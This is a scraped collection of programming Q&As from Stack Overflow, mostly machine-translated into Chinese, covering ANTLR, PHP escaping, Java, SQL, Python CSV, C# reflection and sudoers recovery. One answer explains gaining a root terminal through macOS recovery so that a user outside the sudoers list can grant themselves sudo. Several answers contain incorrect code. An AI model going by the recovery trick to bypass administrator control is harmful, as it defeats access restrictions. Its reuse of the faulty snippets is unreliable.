                System.out.println("Attempting to draw rectangle " + i);

                //message Rectangle attributes
                Font msgFont = new Font( typeface, style, fontSize );
                g.setFont(msgFont);
                FontMetrics metrics = g.getFontMetrics(msgFont);
                int w = metrics.stringWidth(msg);
                int h = metrics.getHeight();
                int x = 0;
                int y = 0;
                Rectangle rect = new Rectangle(x, y, w, h);

                //randomly choose location for text
                rect.x = rand.nextInt(image.getHeight());
                rect.y = rand.nextInt(image.getWidth());

                if(rectList.size() == 0){
                    rectList.add(rect);
                    g.drawString(msg, rect.x, rect.y);
                }
                else{
                    //compare to every existing rectangle
                    for(int j=0; j<rectList.size(); j++){
                        //check if new rectangle intersects with existing rectangles
                        int attempts = 0;
                        while(attempts <= 100){
                            if (rectList.get(j).intersects(rect)){
                                //change rectangle location if intersects
                                rect.setLocation(rand.nextInt(image.getHeight()), rand.nextInt(image.getWidth()));
                                attempts++;
                            }
                            else{
                                rectList.add(rect);
                                g.drawString(msg, rect.x, rect.y);
                                attempts = 101;
                            }
                        }
                    }
                }
            }

            ImageIO.write(image, "jpg", new File(args[0].toString().replace(".", "_watermarked.")));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

} 
```

# antlr - 简单的 Antlr3 Token 解析

> ID：11396634
> 
> 赞同：1
> 
> 时间：2012-07-09T14:03:45.613
> 
> 标签：antlr, antlr3, gunit

虽然我对有关 Antlr 语法的大量问题感到有些欣慰（不仅仅是我试图剃掉这个牦牛形状的东西），但我还没有找到一个可以帮助解决我的问题的问题/答案。

我将 Antlr3.3 与混合令牌/解析器词法分析器一起使用。

我正在使用 gUnit 来帮助证明语法和一些 jUnit 测试；这就是乐趣的开始。

我有一个要解析的简单配置文件：

```
identifier foobar {
port=8080
stub plusone.google.com {
        status-code = 206
        header = []
        body = []
  }
 } 
```

我在解析“标识符”（本例中为 foobar）时遇到问题： 我想允许的有效名称是：

```
foobar
foo-bar
foo_bar
foobar2
foo-bar2
foo_bar2
3foobar
_foo-bar3 
```

依此类推，因此有效的名称可以使用字符`'a..z'|'A..Z', '0..9' '_' and '-'`

我得出的语法是这样的（注意这不是完整的语法，只是与这个问题相关的部分）：

```
fragment HYPHEN : '-' ;

fragment UNDERSCORE : '_' ;

fragment DIGIT  : '0'..'9' ;

fragment LETTER : 'a'..'z' |'A'..'Z' ;

fragment NUMBER : DIGIT+ ;

fragment WORD : LETTER+  ;

IDENTIFIER : DIGIT | LETTER (LETTER | DIGIT | HYPHEN | UNDERSCORE)*; 
```

和相应的 gUnit 测试

```
IDENTIFIER:
"foobar" OK
"foo_bar" OK
"foo-bar" OK
"foobar1" OK
"foobar12" OK
"foo-bar2" OK
"foo_bar2" OK
"foo-bar-2" OK
"foo-bar_2" OK
"5foobar" OK
"f_2-a" OK
"aA0_" OK
// no "funny chars"
"foo@bar" FAIL
// not with whitepsace
"foo bar" FAIL 
```

运行 gUnit 测试仅对“5foobar”失败。我已经设法解析了困难的东西，但解析标识符这一看似简单的任务却打败了我。

谁能指出我哪里出错了？我怎样才能匹配而不贪心？

提前谢谢了。

- 更新 -

我根据 Barts 的回答将语法更改为：

`IDENTIFIER : ('0'..'9'| 'a'..'z'|'A'..'Z' | '_'|'-') ('_'|'-'|'a'..'z'|'A'..'Z'|'0'..'9')* ;`

这修复了失败的 gUnit 测试，但破坏了一个无关的 jUnit 测试，该测试测试“端口”参数。以下语法处理上面配置片段的“port=8080”元素：

```
configurationStatement[MiddlemanConfiguration config]
        :   PORT EQ port=NUMBER {
config.setConfigurationPort(Integer.parseInt(port.getText())); }
            |   def=proxyDefinition { config.add(def); }
; 
```

我得到的信息是：

`mismatched input '8080' expecting NUMBER`

其中 NUMBER 定义为`NUMBER : ('0'..'9')+ ;`

将 NUMBER 的规则移到 IDENTIFIER 块上方，解决了这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:44:09.283

```
IDENTIFIER : DIGIT | LETTER (LETTER | DIGIT | HYPHEN | UNDERSCORE)*; 
```

相当于：

```
IDENTIFIER 
 : DIGIT 
 | LETTER (LETTER | DIGIT | HYPHEN | UNDERSCORE)*
 ; 
```

因此， an`IDENTIFIER`是一个单一的`DIGIT`，或者以 a 开头，`LETTER`后跟`(LETTER | DIGIT | HYPHEN | UNDERSCORE)*`。

你可能的意思是：

```
IDENTIFIER 
 : (DIGIT | LETTER | UNDERSCORE) (LETTER | DIGIT | HYPHEN | UNDERSCORE)*
 ; 
```

但是，这也允许`3---3`作为有效`IDENTIFIER`的，对吗？

# php - mysql_real_escape_string 和 jquery

> ID：11396635
> 
> 赞同：-3
> 
> 时间：2012-07-09T14:03:46.347
> 
> 标签：php, jquery

假设我有一个列产品名称并且它具有价值`Shoe's`。当我从 db 中选择该值并使用`mysql_real_escape_string`并将其放置在 html 隐藏输入中时，它变为`<input type='hidden' value='Shoe\'s' id='product_name'>`

当我这样做`$('#product_name').val()`时，它只返回`Shoe\`截断`s`值的其余部分。jQuery 假设转义单引号作为 attr 值的结束引号。

解决方案是使用`value=""`（用双引号括起来）但是如果值包含双引号怎么办？所以问题依然存在。任何帮助表示赞赏。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:06:26.620

不得`mysql_real_escape_string`用于 HTML 输出。改用适当的[`htmlspecialchars`](http://php.net/htmlspecialchars)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:09:03.710

In HTML, a backslash before a quote does not mean that the quote is escaped. An escaped `'` in HTML is `&#039;`. That's why you use *the appropriate escaping method* for your output target. `mysql_real_escape_string` is appropriate when escaping for SQL, [`htmlspecialchars`](http://php.net/htmlspecialchars) is appropriate when escaping for HTML.

# ios - 应用内购买恢复功能

> ID：11396642
> 
> 赞同：2
> 
> 时间：2012-07-09T14:04:16.557
> 
> 标签：ios, in-app-purchase

任何人都知道如何使用 IAP 进行恢复选项。

我使用非消耗品购买。

我知道我必须实现这个委托方法：

```
- (void)restoreTransaction:(SKPaymentTransaction *)transaction
- (void)paymentQueue:(SKPaymentQueue *)queue restoreCompletedTransactionsFailedWithError:(NSError *)error
- (void)paymentQueueRestoreCompletedTransactionsFinished:(SKPaymentQueue *)queue 
```

但我仍然无法弄清楚用一个进程调用这个方法。

我假设我需要在 `[[SKPaymentQueue defaultQueue] restoreCompletedTransactions];`调用回调方法之前调用此方法。

你能逐步解释它是如何工作的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T15:43:57.227

你猜对了！您唯一需要调用的是：

```
[[SKPaymentQueue defaultQueue] restoreCompletedTransactions]; 
```

这将恢复用户已完成的所有事务。对于每笔交易，`SKPaymentTransactionObserver`都会调用此方法（每次用户购买时也会调用相同的方法）：

```
 - (void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions {
        for (SKPaymentTransaction *transaction in transactions) {
            switch (transaction.transactionState) {
                case SKPaymentTransactionStatePurchased:
                    [self completeTransaction:transaction];
                    break;
                case SKPaymentTransactionStateFailed:
                    [self failedTransaction:transaction];
                    break;
                case SKPaymentTransactionStateRestored:
                    [self restoreTransaction:transaction];
                    break;              
                default:
                    break;
            }
        }

    } 
```

使用 transactionState，如果需要，您可以区分交易是原始购买 ( `SKPaymentTransactionStatePurchased`) 还是恢复 ( `SKPaymentTransactionStateRestored`)。

如果您需要知道恢复何时完成，您可以使用：

```
- (void)paymentQueueRestoreCompletedTransactionsFinished:(SKPaymentQueue *)queue {
   NSLog(@"%d items restored", queue.transactions.count);
} 
```

# java - 基于JUnit类别执行并行测试

> ID：11396645
> 
> 赞同：5
> 
> 时间：2012-07-09T14:04:29.060
> 
> 标签：java, maven, junit, parallel-processing, maven-surefire-plugin

我使用 Junit 4.8 和 maven 3，我有可以并行执行的测试，但其他测试不能，因为它可以访问 Oracle 数据库。我想使用 Junit 类别来指示可以“并行化”的测试和其他测试，并使用简单的“mvn 测试”启动测试。这有可能吗？我认为我的 Maven 配置会是这样的：

```
 <plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-surefire-plugin</artifactId>
  <version>2.12</version>
  <configuration>
     <groups>com.soft.Parallelizable</groups>
     <perCoreThreadCount>false</perCoreThreadCount>
     <forkMode>perthread</forkMode>
     <argLine>-Xms512m -Xmx512m</argLine>
     <parallel>classes</parallel>
     <threadCount>30</threadCount>
   </configuration>
   <configuration>
     <groups>com.soft.NotParallelizable</groups>
   </configuration>
  </plugin> 
```

当然它不起作用，但它只是向你展示我想要做什么。如果有人有想法:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-20T13:16:35.073

在 2.18 版本之后有一个选项：

> 从 Surefire 2.18 开始，您可以应用 JCIP 注释 @net.jcip.annotations.NotThreadSafe

你可以在[这里](http://maven.apache.org/surefire/maven-surefire-plugin/examples/fork-options-and-parallel-execution.html)
阅读它对 我有用

# java - 加载：找不到类 MyApplet：java.lang.ClassNotFoundException。当包中有类文件时，为什么我会得到这个？

> ID：11396646
> 
> 赞同：-1
> 
> 时间：2012-07-09T14:04:29.597
> 
> 标签：java, html, jar, applet, classnotfoundexception

当我尝试运行小程序时出现以下异常：

```
load: class MyApplet not found.
java.lang.ClassNotFoundException: MyApplet
at sun.plugin2.applet.Applet2ClassLoader.findClass(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)
at java.lang.ClassLoader.loadClass(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadCode(Unknown Source)
at sun.plugin2.applet.Plugin2Manager.createApplet(Unknown Source)
at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)
at java.lang.Thread.run(Unknown Source)
Caused by: java.net.SocketTimeoutException: Read timed out
at java.net.SocketInputStream.socketRead0(Native Method)
at java.net.SocketInputStream.read(Unknown Source)
at java.net.SocketInputStream.read(Unknown Source)
at java.io.BufferedInputStream.fill(Unknown Source)
at java.io.BufferedInputStream.read1(Unknown Source)
at java.io.BufferedInputStream.read(Unknown Source)
at sun.net.www.http.HttpClient.parseHTTPHeader(Unknown Source)
at sun.net.www.http.HttpClient.parseHTTP(Unknown Source)
at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
at java.net.HttpURLConnection.getResponseCode(Unknown Source)
at sun.plugin2.applet.Applet2ClassLoader.getBytes(Unknown Source)
at sun.plugin2.applet.Applet2ClassLoader.access$000(Unknown Source)
at sun.plugin2.applet.Applet2ClassLoader$1.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
... 9 more
Exception: java.lang.ClassNotFoundException: MyApplet 
```

*小程序代码：*

```
import javax.swing.*;
import java.awt.*;

public class MyApplet extends JApplet {

public JFrame frame;
public JPanel panel;
public JButton button;

public void init() {
    frame = new JFrame();
    panel = new JPanel();
    button = new JButton("click me ");
    panel.setBackground(Color.RED);
    panel.add(button);
    frame.add(panel);
    frame.setSize(300,300);
    frame.setVisible(true);
}   
} 
```

*html代码：*

```
<applet code="MyApplet" codebase="AppletPackage" archive="JAR.jar" height="800" width="800"> 
```

**JAR.jar 文件包含一个包 Appletpackage，此包包含一个名为的类文件`MyApplet.class`**

![在此处输入图像描述](../Images/d3e04b57f743828202bdcc7e136d646d.png)

为什么我会得到这个异常？我犯了什么错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:49:39.457

参数是相对于`archive`参数解析的`codebase`。因此，在您的情况下，插件将查找`MyApplet.class`包含在 file 中的文件`AppletPackage/JAR.jar`。

您应该将其更改为以下内容：

```
<applet code="AppletPackage.MyApplet" archive="JAR.jar" height="800" width="800"> 
```

这将解析到`AppletPackage/MyApplet.class`与`JAR.jar`HTML 文件相同的目录中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T17:02:30.893

这是试图解决对我的第一个答案的评论中报告的错误消息：

> ```
> java.lang.NoClassDefFoundError: AppletPackage/MyApplet (wrong name: MyApplet) 
> ```

查看[源代码](http://hg.openjdk.java.net/jdk7u/jdk7u6/hotspot/file/2b3acb34791f/src/share/vm/classfile/classFileParser.cpp)，我看到这个“错误名称”错误消息表明文件名和类名不匹配。您声称您的课程在 inside `AppletPackage`，并且文件名`AppletPackage/MyApplet.class`符合此要求。但是您上面引用的源代码没有包含一行

```
package AppletPackage; 
```

您应该添加该行，以便类文件包含类的完全限定名。然后你应该能够加载它。

# sql - 分离字符串并检索。使用空格

> ID：11396651
> 
> 赞同：0
> 
> 时间：2012-07-09T14:04:50.057
> 
> 标签：sql

该字符串包含许多由空格分隔的单词，例如

```
employee_first_nm = "John Walker" 
```

我想单独检索第一部分（“约翰”）。这部分我使用以下代码完成：

```
SUBSTR(employee_first_nm, 1, INSTR(employee_first_nm, ' ')); 
```

在某些情况下，字符串只有一个单词，例如“sonia”，这就是我遇到问题的地方。在这里，如果只有一个单词，该函数根本不会检索任何值。但我希望它在这种情况下获得完整的字符串，即“sonia”。

请帮忙

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:10:58.580

Simply ensure there always *will* be a space;

```
... INSTR(employee_first_nm + ' ', ' ') 
```

If there is already a space in the string then stuffing another one on the end makes no difference as the 1st one will be found, if there is no existing space adding one makes your logic work.

(Usually you also need to `INSTR(..)-1` to strip the trailing space)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:19:22.283

```
SUBSTR(employee_first_nm, 1, INSTR(CONCAT(employee_first_nm,' '), ' ')); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:14:08.647

或者，您可以检查 INSTR 是否返回正确的值：

```
(case when INSTR(employee_first_nm, ' ') > 0
      then SUBSTR(employee_first_nm, 1, INSTR(employee_first_nm, ' '))
      else employee_first_nm
 end) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T14:26:59.617

为什么不在这里利用正则表达式的力量。

```
REGEXP_SUBSTR(employee_first_nm, '^[a-zA-Z]*\s?') 
```

这应该返回您想要的子字符串。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-07-09T14:13:25.423

你可以试试：

```
SUBSTRING(select employee_first_nm,0, charindex(' ',employee_first_nm) 
```

经测试：

```
select substring('John walker',0, charindex(' ','John walker more')) 
```

返回 -> '约翰'

# jvm - 如果不使用 Xmx 会怎样？

> ID：11396654
> 
> 赞同：9
> 
> 时间：2012-07-09T14:04:54.103
> 
> 标签：jvm

根据 JVM 的文档，如果您使用太大的 Xms 参数，JVM 将无法启动。所以，我问，如果我不使用它会发生什么？我的虚拟机可以无限增长吗？它只会在物理内存耗尽时停止吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-09T14:12:43.063

XMX 是最大堆大小。

> 如果我不使用它会怎样？

如果省略，则使用默认值。默认值因 JVM 版本和运行的平台而异。第 5 版的详细信息[在此处](http://java.sun.com/docs/hotspot/gc5.0/ergo5.html#0.0.%20Garbage%20collector,%20heap,%20and%20runtime%20compiler%7Coutline)。

> 默认情况下，在服务器级机器上选择以下选项。
> 
> ...
> 
> 最大堆大小为 ¼ 物理内存，最大 1Gbyte

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-17T10:28:04.713

如果您不指定`-Xmx`，那么您将获得操作系统、jvm、选项和版本的默认分配。

考虑到可能影响价值的事物的数量以及导航文档所需的时间，询问您的 jvm 可能会更容易。

例如在我的 Linux 系统上：

```
$ java -XX:+PrintFlagsFinal -version 2>&1 | grep -i -E 'heapsize|permsize|version'
uintx AdaptivePermSizeWeight               = 20               {product}
uintx ErgoHeapSizeLimit                    = 0                {product}
uintx InitialHeapSize                     := 66328448         {product}
uintx LargePageHeapSizeThreshold           = 134217728        {product}
uintx MaxHeapSize                         := 1063256064       {product}
uintx MaxPermSize                          = 67108864         {pd product}
uintx PermSize                             = 16777216         {pd product}
java version "1.6.0_24" 
```

因为它默认为`-server`，但`-client`我得到：

```
$ java -client -XX:+PrintFlagsFinal -version 2>&1 | grep -i -E 'heapsize|permsize|version'
uintx AdaptivePermSizeWeight               = 20               {product}
uintx ErgoHeapSizeLimit                    = 0                {product}
uintx InitialHeapSize                     := 16777216         {product}
uintx LargePageHeapSizeThreshold           = 134217728        {product}
uintx MaxHeapSize                         := 268435456        {product}
uintx MaxPermSize                          = 67108864         {pd product}
uintx PermSize                             = 12582912         {pd product}
java version "1.6.0_24" 
```

在我的 Windows 系统上，我得到：

```
C:\>java -XX:+PrintFlagsFinal -version 2>&1 | findstr /I "heapsize permsize version"
uintx AdaptivePermSizeWeight               = 20               {product}
uintx ErgoHeapSizeLimit                    = 0                {product}
uintx InitialHeapSize                     := 16777216         {product}
uintx LargePageHeapSizeThreshold           = 134217728        {product}
uintx MaxHeapSize                         := 268435456        {product}
uintx MaxPermSize                          = 67108864         {pd product}
uintx PermSize                             = 12582912         {pd product}
java version "1.6.0_21" 
```

这是`-client`设置，似乎没有`-server`选项：

```
C:\>java -server -XX:+PrintFlagsFinal -version 2>&1 | findstr /I "heapsize permsize version"
C:\>java -server -XX:+PrintFlagsFinal -version
Error: no `server' JVM at `C:\jdk\jre\bin\server\jvm.dll'. 
```

# python - 如何用 Python 编写 csv 文件？

> ID：11396655
> 
> 赞同：0
> 
> 时间：2012-07-09T14:04:54.870
> 
> 标签：python, csv

> **可能重复：**
> [python csv：将结果保存到 csv 文件](https://stackoverflow.com/questions/3345336/python-csv-save-results-to-csv-file)
> [Python：如何将元组值的字典写入 csv 文件？](https://stackoverflow.com/questions/5530619/python-how-to-write-a-dictionary-of-tuple-values-to-a-csv-file)

以前我使用它逐行将结果写入文本文件，在每一行中，值由制表符分隔

```
fd_out.write("%s\t%d\t%d\t%s\n" % (obj["name"],obj["count"],obj["age"],obj["params"]["country"]) 
```

但现在我想要 CSV 输出，我想如何编写代码？就像这样还是应该导入 CSV 并使用其他方法？对不起，我是一个编程新手...

```
fd_out.write("%s,%d,%d,%s\n" % (obj["name"],obj["count"],obj["age"],obj["params"]["country"]) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T14:10:06.947

您的代码应该适用于基本数据，但如果您的数据中有逗号，则在某些情况下可能会出现一些问题。

该`csv`模块负责处理该问题以及任何类似问题。用法很简单，你只需：

```
writer = csv.writer(fd_out)
writer.writerows((obj["name"],obj["count"],obj["age"],obj["params"]["country"])) 
```

注意双括号，我们传递一个元组，因为`writerows`除了一个可迭代的。如果您想了解更多信息，请随时查看[文档。](http://docs.python.org/library/csv.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:08:32.830

“CSV”不是标准，即使“CSV”字面意思是“逗号分隔值”，使用制表符作为分隔符与逗号一样常见，如果不是更常见的话。另见维基百科：[http ://en.wikipedia.org/wiki/Comma-separated_values](http://en.wikipedia.org/wiki/Comma-separated_values)

为了满足包含分隔符（即制表符或逗号）的 CSV 字段，通常会引用数据，即使用双引号。没有标准 - 有时只引用包含分隔符的数据字段。在下面的示例中，所有字段都将被引用。

使用 csv 内置库，可以很容易地根据需要修改输出 CSV 文件的格式。

```
import csv

objs = [{'name': 'knut', 'age': 74, 'count': 13},
        {'name': 'lydia', 'age': 14, 'count': 3}]

with open("/tmp/example.csv", "w") as outfile:
    ## Ordering of the fields in the CSV output
    headers = ['name', 'age', 'count']

    ## although "CSV" stands for "comma separated values", 
    ## it's quite common to use other delimiters i.e. TAB
    ## and still call it "CSV".
    writer = csv.writer(outfile, delimiter="\t", quotechar='"', quoting=csv.QUOTE_ALL)

    ## it's common in CSV to have the headers on the first line
    writer.writerow(headers)

    ## Write out the data
    for obj in objs:
        writer.writerow([obj[key] for key in headers]) 
```

这个例子还演示了 python 中的简明列表操作……`[obj[key] for key in headers]`意思是“给我标题中所有键的 obj[key] 列表”。

# java - java多行按钮 - 禁用颜色问题

> ID：11396656
> 
> 赞同：0
> 
> 时间：2012-07-09T14:04:56.910
> 
> 标签：java, swing, jbutton

我有以下问题：我想要一个带有换行符的 JButton。我正在使用 html 方法来完成它。

`<hmlt>Bla<br>Bla</html>`

如果我禁用按钮，就会出现问题。除了“html-styled”按钮外，它工作正常。按钮的颜色保持不变。在我刚刚使用的另一个按钮上`&#8592+;`（没有“+”），它工作正常，如果我禁用他，箭头会变灰。所以我搜索了一些时间来寻找换行符的 unicode 或 html 编号，但它不起作用（例如`&#10+;`）所以有人可以给我一个建议吗？我知道它可以在 java 中完成，但我更喜欢 html 方式，因为它实现起来更快:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-10T00:15:07.713

请参阅[如何在 Swing 组件中使用 HTML：ButtonHtmlDemo](http://docs.oracle.com/javase/tutorial/uiswing/components/html.html)：

> ..还要注意，当一个按钮被禁用时，它的 HTML 文本不幸地保持黑色，而不是变成灰色。（请参阅[错误 #4783068](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4783068)以查看这种情况是否会改变。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T15:01:24.610

我认为带有 HTML 文本的组件不会受到禁用它们通常会导致的修改后的文本样式的影响。

您可以覆盖按钮的`getText()`方法以返回不同的 HTML，包括文本的样式，具体取决于按钮是否被禁用，但如果您想正确使用它可能会更容易扩展 UI 以允许多行而不依赖在 HTML 上。

# java - Android / Java：将数字四舍五入以获得小数

> ID：11396658
> 
> 赞同：10
> 
> 时间：2012-07-09T14:05:05.430
> 
> 标签：java, integer, rounding

如何将十进制数四舍五入为整数。

> 3.50 => 4
> 
> 4.5 => 5
> 
> 3.4 => 3

你如何在 Java 中做到这一点？谢谢！

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-07-09T14:07:39.507

具有标准的舍入功能？ [`Math.round()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Math.html#round%28double%29)

还有`Math.floor()`和`Math.ceil()`，这取决于您的需要。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-07-09T14:08:33.160

You can use

`int i = Math.round(f); long l = Math.round(d);`

where `f` and `d` are of type `float` and `double`, respectively.

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-07-09T14:21:01.550

如果你只使用正数，你也可以使用 int i = (int)(d + 0.5)。

编辑：如果你想将负数向上舍入（例如，向正无穷大，例如 -5.4 变为 -5），你也可以使用它。如果您想四舍五入到更高的量级（四舍五入-5.4 到-6），建议您使用另一个答案提出的其他函数。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-09T14:07:43.817

Java provides a few functions in the Math class to do this. For your case, try `Math.ceil(4.5)` which will return 5.

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-07-09T15:39:48.523

```
new BigDecimal(3.4);
Integer result = BigDecimal.ROUND_HALF_UP; 
```

或者

```
Int i = (int)(202.22d); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-07-10T16:38:51.467

使用 Math.max 你可以这样做：

```
(int) Math.max(1, (long) Math.ceil((double) (34) / 25) 
```

这会给你 2

# python - 计算Python中列中单词的频率

> ID：11396665
> 
> 赞同：2
> 
> 时间：2012-07-09T14:05:28.250
> 
> 标签：python, csv, tabular

我有一个 csv 文件。csv文件的结构是：

```
Name Hour Location
A    4    San Fransisco
B    2    New York
C    4    New York
D    7    Denton
E    8    Boston
F    1    Boston 
```

如果你观察上面的数据，有

```
2 New York and
2 Boston 
```

我尝试使用表格包。我尝试了表格包文档中提到的教程超过 7 个小时。但我勉强通过。

任何人都可以帮助我，我如何使用 Python 在 Location 列中提取该 Csv 文件中的常用词的计数。

谢谢你。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-09T14:16:39.443

```
data = """Name\tHour\tLocation
A\t4\tSan Fransisco
B\t2\tNew York
C\t4\tNew York
D\t7\tDenton
E\t8\tBoston
F\t1\tBoston
"""

import csv
import StringIO
from collections import Counter

input_stream = StringIO.StringIO(data)
reader = csv.reader(input_stream, delimiter='\t')

reader.next() #skip header
cities = [row[2] for row in reader]

for (k,v) in Counter(cities).iteritems():
    print "%s appears %d times" % (k, v) 
```

输出：

```
San Fransisco appears 1 times
Denton appears 1 times
New York appears 2 times
Boston appears 2 times 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-09T14:15:10.590

不知道你用什么来分隔，但这个例子显示为 4 个空格，所以这是一个解决方案。

如果您实际上是按制表符分隔，请使用@MariaZverina 的答案

```
import collections

with open('test.txt') as f:
    next(f) # Skip the first line
    print collections.Counter(line.rstrip().rpartition('    ')[-1] for line in f) 
```

输出：

```
Counter({'New York': 2, 'Boston': 2, 'San Fransisco': 1, 'Denton': 1}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:23:33.130

如果文件不是太大，最天真的方法是：

*   逐行读取文件
*   将位置值附加到列表中
*   从该列表中构建一组唯一性
*   确定列表中每个唯一值的计数

# linux - 当您没有权限时在 Mac 或 Linux 上编辑 sudoers 文件

> ID：11396678
> 
> 赞同：2
> 
> 时间：2012-07-09T14:06:17.583
> 
> 标签：linux, macos, permissions, sudo, sudoers

我正在尝试在我的 MacOS（或 Linux）系统上安装一些东西，但我没有权限，因为我不是管理员。所以我尝试使用`sudo`它，它说我不在`/etc/sudoers`文件中。我试过编辑`sudoers`文件，但它不允许我，所以我“用谷歌搜索”它。大家都说用`visudo`编辑文件。问题是，它甚至不让我使用`visudo`！当我输入“visudo”时，它只是说

```
visudo: /etc/sudoers: Permission denied 
```

将不胜感激一些帮助。提前致谢！

编辑：我尝试切换用户，然后编辑 sudoers 文件，但仍然没有工作

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:07:31.117

您需要`root`（或拥有`root`特权）才能使用`visudo`命令和编辑`sudoers`文件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T11:04:26.307

如果你弄乱了你的 sudoers 文件。你需要：

*   重新启动进入恢复模式（在启动过程中点击退出，在 grub 屏幕上选择恢复模式选项）
*   选择“启用网络”选项（如果您不这样做，您的文件系统将被安装为只读。谁知道）
*   选择“Drop to root shell”选项
*   运行visudo，修复你的文件
*   使用普通 grub 选项重新启动

来源：- [http://mario.net.au/content/recover-etcsudoers-ubuntu-1204](http://mario.net.au/content/recover-etcsudoers-ubuntu-1204)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-26T16:34:57.083

您必须是 root 或使用 sudo 来编辑 sudoers 文件。

```
sudo visudo 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-04-04T17:54:37.360

我是 mac 新手。sudoer 的 time=0 非常恼火（每次使用 sudo 时都必须输入密码）。我想将此值增加到一个合理的数字：timestamp_timeout=30。将上述行添加到 /etc/sudoers 文件后，我无法再以 su 身份登录，因为解析器无法读取 sudoers 文件。这篇文章是为了记录我如何解决这个问题。

```
1\. Restart your mac
2\. Hold on to Command-R two keys until you see the progress bar.
3\. Start a new terminal, this terminal will be the root terminal
4\. Edit the invalid sudoers file.  Note this file is not in /etc/sudoers when you loggedin in as root 
```

完整路径是： /Volumes/Macintosh HD/etc restart 然后你又开心了。

此方法也适用于不在 sudoers 列表中并希望将自己添加到列表中的用户。

注意：如果您无法以 root 身份找到 sudoers 文件，请使用 find：

查找 / -name sudoers

# c# - 如何使用反射调用泛型类的静态属性？

> ID：11396679
> 
> 赞同：9
> 
> 时间：2012-07-09T14:06:19.097
> 
> 标签：c#, .net, generics, reflection

我有一个类（我无法修改）可以简化为：

```
public class Foo<T> {
    public static string MyProperty {
         get {return "Method: " + typeof( T ).ToString(); }
    }
} 
```

我想知道当我只有一个时如何调用此方法`System.Type`

**IE**

```
Type myType = typeof( string );
string myProp = ???;
Console.WriteLinte( myMethodResult ); 
```

**我试过的：**

我知道如何用反射实例化泛型类：

```
Type myGenericClass = typeof(Foo<>).MakeGenericType( 
    new Type[] { typeof(string) }
);
object o = Activator.CreateInstance( myGenericClass ); 
```

但是，由于我使用的是静态属性，因此实例化一个类是否合适？如果我无法编译时间转换，如何访问该方法？（System.Object 没有定义`static MyProperty`）

**编辑** 我在发布后意识到，我正在使用的类是一个属性，而不是一个方法。我为混乱道歉

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T14:10:37.550

该方法是静态的，因此您不需要对象的实例。您可以直接调用它：

```
public class Foo<T>
{
    public static string MyMethod()
    {
        return "Method: " + typeof(T).ToString();
    }
}

class Program
{
    static void Main()
    {
        Type myType = typeof(string);
        var fooType = typeof(Foo<>).MakeGenericType(myType);
        var myMethod = fooType.GetMethod("MyMethod", BindingFlags.Static | BindingFlags.Public);
        var result = (string)myMethod.Invoke(null, null);
        Console.WriteLine(result);
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T14:12:24.033

好吧，您不需要实例来调用静态方法：

```
Type myGenericClass = typeof(Foo<>).MakeGenericType( 
    new Type[] { typeof(string) }
); 
```

可以...然后，简单地说：

```
var property = myGenericClass.GetProperty("MyProperty").GetGetMethod().Invoke(null, new object[0]); 
```

应该这样做。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-09T14:13:57.330

```
typeof(Foo<>)
    .MakeGenericType(typeof(string))
    .GetProperty("MyProperty")
    .GetValue(null, null); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-09T14:09:37.727

你需要这样的东西：

```
typeof(Foo<string>)
    .GetProperty("MyProperty")
    .GetGetMethod()
    .Invoke(null, new object[0]); 
```

# php - 表单提交时PHP自动递增编号

> ID：11396680
> 
> 赞同：0
> 
> 时间：2012-07-09T14:06:24.803
> 
> 标签：php, mysql, phpmyadmin

我有一个脚本，它根据数据库中的值计算报价。

我需要一些简单的 PHP 代码来显示一个数字并在每次提交表单时给它加 1。

